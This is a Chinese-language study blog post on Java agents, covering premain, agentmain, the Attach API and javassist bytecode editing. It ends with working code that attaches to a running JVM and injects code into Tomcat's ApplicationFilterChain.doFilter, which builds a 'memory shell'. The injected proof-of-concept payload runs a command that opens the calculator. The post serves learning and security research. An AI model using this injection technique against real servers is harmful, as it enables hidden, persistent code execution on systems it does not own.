---
title: javaAgent内存马
date: 2022-04-25 13:29:13
tags:
      - javaAgent
      - memshell
categories: java
description: 记录一下javaAgent的学习
---

在jdk1.5以后,javaAgent是一种能够在不影响正常编译的情况下,修改字节码的技术

java作为一种强类型语言,不通过编译就不能够进行jar包的生成,而有了javaAgent技术,就可以在字节码这个层面对类和方法进行修改,同时,也可以把javaAgent理解成一种代码注入的方式,但是这种注入比起spring的aop更加优美



java agent使用方式

实现`premain`方法在JVM启动前加载

从字面上理解,就是运行在main函数之前的类,当java虚拟机启动时,在执行main函数之前,JVM会先运行javaAgent所指定jar包内Premain-Class这个类的premain方法

实现`agentmain`在JVM启动后加载



主要的接口代码在rt.jar java.lang.instrument包下面

实现代码在

JVM会优先加载带`Instrumentation`签名的方法,加载成功则忽略不带签名的,如果没有带签名的,则加载不带签名的,这个逻辑在`InstrumentationImpl`中

![image-20220425142219666](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220425142219666.png)

Instrumentation接口定义

```java
public interface Instrumentation {
    
    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。
    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);

    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    //删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    boolean isRetransformClassesSupported();

    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    boolean isRedefineClassesSupported();

    
    void redefineClasses(ClassDefinition... definitions)
        throws  ClassNotFoundException, UnmodifiableClassException;

    boolean isModifiableClass(Class<?> theClass);

    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

  
    @SuppressWarnings("rawtypes")
    Class[] getInitiatedClasses(ClassLoader loader);

    //获取一个对象的大小
    long getObjectSize(Object objectToSize);


   
    void appendToBootstrapClassLoaderSearch(JarFile jarfile);

    
    void appendToSystemClassLoaderSearch(JarFile jarfile);

    
    boolean isNativeMethodPrefixSupported();

    
    void setNativeMethodPrefix(ClassFileTransformer transformer, String prefix);
}

```

如何实现一个javaAgent

使用javaAgent需要几个步骤

1.定义一个MANIFEST.MF文件,必须包含Premain-Class选型,通常也会加入Can-Redefine-Classes和Can-Retransform-Classes选项

2.创建一个Premain-Class指定的类,类中包含premain方法,方法逻辑由用户自定确定

3.将premain的类和MANIFEST.MF文件打包成jar包

4.使用参数 -javaagent:jar包路径 启动要代理的方法

在执行以上步骤后,JVM会先执行premain方法,大部分类加载都会通过该方法,注意:是大部分,不是所有.当然,遗漏的主要是系统类,因为很多系统类先于agent执行,而用户类的加载肯东是会被拦截的.也就是说,这个方法是在main方法启动前拦截大部分类的加载活动,既然可以拦截类的加载,那么久可以去做重写类这样的操作,结合第三方的字节码编译工具,比如ASM,javassist,cglib,bytebubby等等来改写实现类

#### 代码实现

实现javaagent需要搭建两个工程,一个工程师用来承载javaagent类,单独的打成jar包;

一个工程师javaagent需要去代理的类,即javaagent会在这个工程中的main方法启动之前去做一些事情



#### premain简单实现

1.新建项目

项目结构如图

![image-20220426090315058](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426090315058.png)

没有建立包的原因是为了后面命令行执行的时候方便操作

mainTest文件

```java

public class MainTest {
    public static void main(String[] args) {
        System.out.println("main方法执行!!!");
    }
}

```

AgentTest文件(内部实现premain方法)

```java
import java.lang.instrument.Instrumentation;

public class AgentTest {

    public static void premain(String args, Instrumentation instrumentation)throws Exception{
        System.out.println("premain agent!!!!");
        System.out.println(args);

    }
}
```

```java
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: AgentTest

```

将项目以Artifacts模式打包为jar包,(其实主要打包的是premain的类)

![image-20220426090634611](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426090634611.png)

![image-20220426092321902](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426092321902.png)

![image-20220426092334442](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426092334442.png)

打包为jar包在out目录下

![image-20220426092359077](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426092359077.png)

这个时候不写包名的作用就体现出来了,将刚才打包的jar和javaagent作为参数去运行MainTest

```bash
java -javaagent:E:\java\rubbish\test1\out\artifacts\test1_jar\test1.jar MainTest
```

虽然成功执行了,但是乱码了,很烦

![image-20220426093144597](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426093144597.png)

premain的这种方式需要在启动时用`-javaagent`参数绑定,存在一定的局限性,在实际环境中,目标的JVM通常是已经启动的状态,无法预先加载premain,相比之下,agentmain更加实用

### agentmain

不知道为什么,tools.jar是添加到环境变量中的,但是`com.sun.tools.attach`还是报红

直接导入外部依赖将tools.jar的真实路径填写,就不报红了

```xml
<dependency>
        <groupId>com.sun</groupId>
        <artifactId>tools</artifactId>
        <version>1.8.0</version>
        <scope>system</scope>
        <systemPath>D:\environment\jdks\jdk1.8.0_65\lib\tools.jar</systemPath>
    </dependency>
```

写一个`agentmain`和`premain`差不多,只需要在`META-INF/MANIFEST.MF`中加入`Agent-Class:`即可

不同的是,这种方法不是通过JVM启动前的参数来指定的,官方为了实现启动后加载,提供了`Attach API`,`Attach API`很简单,只有2个主要的类,都在`com.sun.tools.attach`包里面

主要关注抽象类`VirtualMachine`

字面意思就是虚拟机,也就是程序需要监控的目标虚拟机,提供了获取系统信息,它里面提供了获取系统信息、 `loadAgent`，`Attach` 和 `Detach` 等方法

```java
// 获得当前所有的JVM列表
    public static List<VirtualMachineDescriptor> list() { ... }

    // 根据pid连接到JVM
    public static VirtualMachine attach(String id) { ... }

    // 断开连接
    public abstract void detach() {}

    // 加载agent，agentmain方法靠的就是这个方法
    public void loadAgent(String agent) { ... }}
```

其中list()返回的是一个`VirtualMachineDescriptor`列表,`VirtualMachineDescriptor`类其中的成员有下面几个,id应该是jvm对应的pid

![image-20220426115600828](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426115600828.png)

所以在使用attach方法前先使用list获取到id

所以大体操作方法还是和premain的差不多,还是通过artifacts->build打包成jar

项目结构一样

![image-20220426122014335](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426122014335.png)

首先把agent打包成jar

写一个有agentmain方法的类

```java
import java.lang.instrument.Instrumentation;

public class AgentMainTest {
    public static void agentmain(String args, Instrumentation instrumentation){

        for(int i=0;i<10;i++){
            System.out.println("hello I`m agentMain!!!");
        }
    }
}

```

在MF文件中加入Agent-Class即可

```java
Manifest-Version: 1.0
Agent-Class: AgentMainTest

```

后面的步骤就比premain的时候简单多了,只需要连接虚拟机,提供代理jar包路径即可运行其中的`agantmain`方法

```java
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import java.util.List;
public class AgentMain {

    public static void main(String[] args) throws Exception{
        //E:\java\rubbish\agent\out\artifacts\agent_jar\agent.jar
        List<VirtualMachineDescriptor> virtualMachineDescriptors = VirtualMachine.list();
        String id=virtualMachineDescriptors.get(1).id();
        //连接虚拟机
        VirtualMachine vm=VirtualMachine.attach(id);
        //提供代理jar包路径
        vm.loadAgent("E:\\java\\rubbish\\agent\\out\\artifacts\\agent_jar\\agent.jar");
        vm.detach();
        System.out.println("ends-------------------");
    }
}

```

这里有个问题,就是jvm的id需要小猜一下

![image-20220426164713688](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426164713688.png)

### instrumentation

`instrumentation`是`JVMTIAgent` (JVM Tool Interface Agent)的一部分,Java agent通过这个类和目标JVM进行交互,从而达到修改数据的效果

```java
public interface Instrumentation {
    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);
    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);
    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;
    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);
    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class\[\] getAllLoadedClasses();
    ......}
```

##### getAllloadedClasses和isModifiableClass

修改agentmain,在其中添加`getAllloadedClasses`方法

```java
import java.lang.instrument.Instrumentation;

public class AgentMainTest {
    public static void agentmain(String args, Instrumentation instrumentation){

        Class[] classes=instrumentation.getAllLoadedClasses();
        for(Class aclass: classes){
            System.out.println(aclass.getName()+"\tModifiable==>"+(instrumentation.isModifiableClass(aclass)?"true":"false"));
        }
    }
}

```

![image-20220426165933108](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220426165933108.png)

##### addTransformer()和retransformClasses()

在addTransformer()中的参数`ClassFileTransformer transformer`可以帮助我们完成修改字节码的工作

这是一个接口,提供了一个`transform`方法

```java
public interface ClassFileTransformer {
    default byte\[\]
    transform(  ClassLoader         loader,
                String              className,
                Class<?>            classBeingRedefined,
                ProtectionDomain    protectionDomain,
                byte\[\]              classfileBuffer) {
        ....
    }}
/*使用Instrumentation.addTransformer()来加载一个转换器。

转换器的返回结果（transform()方法的返回值）将成为转换后的字节码。

对于没有加载的类，会使用ClassLoader.defineClass()定义它；对于已经加载的类，会使用ClassLoader.redefineClasses()重新定义，并配合Instrumentation.retransformClasses进行转换。
*/
```

现在有了修改Class字节码的方法,还缺少一个工具`javassist`

#### javassist

>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库;它使 Java 程序能够在运行时定义一个新类, 并在 JVM 加载时修改类文件。
>
>我们常用到的动态特性主要是反射，在运行时查找对象属性、方法，修改作用域，通过方法名称调用方法等。在线的应用不会频繁使用反射，因为反射的性能开销较大。其实还有一种和反射一样强大的特性，但是开销却很低，它就是Javassit。
>
>与其他类似的字节码编辑器不同, Javassist 提供了两个级别的 API: 源级别和字节码级别。 如果用户使用源级 API, 他们可以编辑类文件, 而不知道 Java 字节码的规格。 整个 API 只用 Java 语言的词汇来设计。 您甚至可以以源文本的形式指定插入的字节码; Javassist 在运行中编译它。 另一方面, 字节码级 API 允许用户直接编辑类文件作为其他编辑器。

##### ClassPool

这个类是javassist的核心组件之一

简单来说，这就是个容器，存放的是`CtClass`对象。

获得方法： ClassPool cp = ClassPool.getDefault();。通过 ClassPool.getDefault() 获取的 ClassPool 使用 JVM 的类搜索路径。**如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类，因为 Web 服务器使用多个类加载器作为系统类加载器。在这种情况下，ClassPool 必须添加额外的类搜索路径。**

`cp.insertClassPath(new ClassClassPath(<Class>));`

##### CtClass

可以把它理解成加强版的Class对象,需要从ClassPool中获得

获得方法`CtClass cc=cp.get(ClassName)`

##### CtMethod

可以理解为加强版的Method对象

获得方法:`CtMethod m=cc.getDeclaredMethod(MethodName)`

这个类提供了一些方法,让我们可以很方便的修改方法体

```java
public final class CtMethod extends CtBehavior {
    // 主要的内容都在父类 CtBehavior 中}// 父类 CtBehaviorpublic abstract class CtBehavior extends CtMember {
    // 设置方法体
    public void setBody(String src);
    // 插入在方法体最前面
    public void insertBefore(String src);
    // 插入在方法体最后面
    public void insertAfter(String src);
    // 在方法体的某一行插入内容
    public int insertAt(int lineNum, String src);}
```

传递给方法 `insertBefore()` ，`insertAfter()` 和 `insertAt()` 的 String 对象**是由`Javassist` 的编译器编译的**。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：

| 符号          | 含义                                                         |
| :------------ | :----------------------------------------------------------- |
| $0, $1, $2, … | $0 = this; $1 = args[1] .....(也就是$0代表this,$1..这些代表当前方法的参数) |
| $args         | 方法参数数组.它的类型为 Object[]                             |
| $$            | 所有实参。例如, m($$) 等价于 m($1,$2,…)                      |
| $cflow(…)     | cflow 变量                                                   |
| $r            | 返回结果的类型，用于强制类型转换                             |
| $w            | 包装器类型，用于强制类型转换                                 |
| $_            | 返回值                                                       |

一个简单的agent例子

#### agent.jar

首先看agent.jar包内的代码

##### MANIFEST.MF

```java
Manifest-Version: 1.0
Agent-Class: AgentDemo
Can-Redefine-Classes: true
Can-Retransform-Classes: true

```

##### TransformerDemo.java

`ClassFileTransformer`实现类

```java
public class TransformerDemo implements ClassFileTransformer {
    public String targetClassName;
    public String targetMethodName ;
    public String targetVMClassName;

    public TransformerDemo(String targetClassName, String targetMethodName) {
        this.targetClassName = targetClassName;
        this.targetMethodName = targetMethodName;
        this.targetVMClassName = new String(targetClassName).replaceAll("\\.","\\/");
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException  {
        if(!className.equals(targetVMClassName)){
            System.out.println("not do transform");
            return classfileBuffer;
        }
        try {
            System.out.println("do transform");
            ClassPool cp = ClassPool.getDefault();

            CtClass ctc = cp.get(this.targetClassName);
            System.out.println(ctc.getName());
            CtMethod method = ctc.getDeclaredMethod(this.targetMethodName);
            System.out.println(method.getName());
            String source = "{System.out.println(\"hello transformer\");}";
            method.setBody(source);
            byte[] bytes = ctc.toBytecode();

            return bytes;
        } catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```

##### AgentDemo.java

agentmain方法实现类

```java
public class AgentDemo {
    private static String className = "com.test.Hello";
    private static String methodName = "hello";

    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception {
        System.out.println("agentmain启动!!");
        inst.addTransformer(new TransformerDemo(className, methodName), true);
        //这个参数一定要写true,否则new出来的transformer不能修改类
        try {
            List<Class> needRetransformClasses = new LinkedList<Class>();
            Class[] loadedClasses = inst.getAllLoadedClasses();
            for (Class c : loadedClasses) {
                if (c.getName().equals(className)) {
                    System.out.println("找到要修改的类了!!!");
                    Method[] methods = c.getDeclaredMethods();
                    for (Method method : methods) {
                        System.out.println(method.getName());
                    }
                    inst.retransformClasses(c);
                }
            }

        } catch (Exception e) {

        }

    }
}
```

然后按照之前打包的方法打包成jar包

接下来是测试类代码

##### Hello.java

这个类中的hello方法是要修改的目标方法

```java
package com.test;

public class Hello {
    public void hello() throws InterruptedException {
            System.out.println("hello world!!!");
    }

    public static void main(String[] args)throws Exception {
        Hello h1 = new Hello();
        while(true){
            h1.hello();
            Thread.sleep(1000);
        }
    }
}

```

##### HelloWorld.java

这个类是连接虚拟机启动javaagent的类

我在里面写了个循环遍历list,这样就不用等Hello运行之后再`jps -l`方法去寻找对应的pid了

```java
package com.test;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;
public class HelloWorld {
    public static void main(String[] args) throws Exception{
        List<VirtualMachineDescriptor> virtualMachineDescriptors = VirtualMachine.list();
        for(int i=0;i<virtualMachineDescriptors.size();i++){
            if(virtualMachineDescriptors.get(i).displayName().contains("Hello")){
                try{
                    String id=virtualMachineDescriptors.get(i).id();
                    //连接虚拟机
                    VirtualMachine vm=VirtualMachine.attach(id);
                    //提供代理jar包路径
                    vm.loadAgent("H:\\java\\rubbish\\agent\\out\\artifacts\\agent_jar\\agent.jar");
                    vm.detach();
                    System.out.println("ends----");
                    break;
                }catch (Exception e){
                    continue;
                }
            }
        }
    }
}

```

![image-20220426220901529](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220426220901529.png)



#### Agent内存马

在实验过程中,出现了一个让我摸不着头脑的错误

经过多次尝试和su18大佬的指导,确定了问题所在

首先解决了昨天不能调试的问题

在tomcat项目(比如springMVC)的lib中引入agent.jar,然后就可以看到对应的class文件,在对应的class文件中下断点即可

但是无法得知getDefault方法的结果

使用idea的evaluate expression来运行得到报错信息,是类未找到,也就是说,没有找到对应的.calss文件,解决了好久,尝试了自己写类加载器,但是还是失败了

<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220427143235362.png" alt="image-20220427143235362" style="zoom: 67%;" />



最后参考了[rebeyond](https://github.com/rebeyond/memShell)大佬的做法,将javassist.jar解压后的到的jvassist文件夹放到agent的代码同级目录一起打包成agent.jar

> 打包之前,需要先删除已有的artifacts,否则会把这个javassist继续打包成jar,只需要按照最上面的设置重新整一个artifacts就行了

![image-20220429105814605](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220429105814605.png)

这样完美解决了找不到类的问题

##### 代码

连接虚拟机启动的代码并没有变化,主要的变化在agent中

MANIFEST.MF文件没有变化

##### AgentDemo

```java
import java.lang.instrument.Instrumentation;
public class AgentDemo {
    private static String className = "org.apache.catalina.core.ApplicationFilterChain";
    private static String methodName = "doFilter";

    public static void agentmain(String agentArgs, Instrumentation inst) throws Exception {

        System.out.println("agentmain启动!!");
        Class[] loadedClasses = inst.getAllLoadedClasses();
        try {

            for (Class c : loadedClasses) {
                if (c.getName().equals(className)) {
                    System.out.println("找到要修改的类了!!!");

                    inst.addTransformer(new TransformerDemo(className, methodName), true);
                    inst.retransformClasses(c);
                }
            }

        } catch (Exception e) {

        }

    }

}

```

##### TransformerDemo

```java
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLDecoder;
import java.security.ProtectionDomain;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class TransformerDemo implements ClassFileTransformer {
    public String targetClassName;
    public String targetMethodName;
    public String targetVMClassName;

    public TransformerDemo(String targetClassName, String targetMethodName) {
        this.targetClassName = targetClassName;
        this.targetMethodName = targetMethodName;
        this.targetVMClassName = new String(targetClassName).replaceAll("\\.", "\\/");
    }
    public String readTXT(String path) {
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(path), "utf-8"));
            StringBuffer bf = new StringBuffer();
            String line = null;
            while ((line = br.readLine()) != null) {
                bf.append(line);
            }

            br.close();
            return bf.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        if (!className.equals(targetVMClassName)) {

            return classfileBuffer;
        }
                try {

                    System.out.println("do transform");
                    ClassPool cp=ClassPool.getDefault();
                    if (classBeingRedefined != null) {
                        //添加新的路径
                        ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                        cp.insertClassPath(ccp);
                    }
                    System.out.println("获取到ClassPool");
                    CtClass ctc = cp.get(this.targetClassName);
                    System.out.println(ctc.getName());
                    CtMethod method = ctc.getDeclaredMethod(this.targetMethodName);
                    System.out.println(method.getName());


                    String source = readTXT("C:\\Users\\yuand\\Desktop\\data2.txt");
                    source="try {\n" +
                            "            Runtime.getRuntime().exec(\"calc\");\n" +
                            "        } catch (java.io.IOException e) {\n" +
                            "            e.printStackTrace();\n" +
                            "        }";

                    System.out.println("执行插入代码方法");

                    method.insertBefore(source);
                    byte[] bytes = ctc.toBytecode();
                    ctc.detach();
                    return bytes;

                }
                catch (Exception e){


                    e.printStackTrace();
                }
        return null;
    }


}


```

插入代码这里通过txt文件读取的代码总是因为格式原因报错,直接写的打开计算器的代码可以正常插入并执行

![image-20220429110139169](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220429110139169.png)

对于txt文件内代码格式问题还需要再稍微研究一下
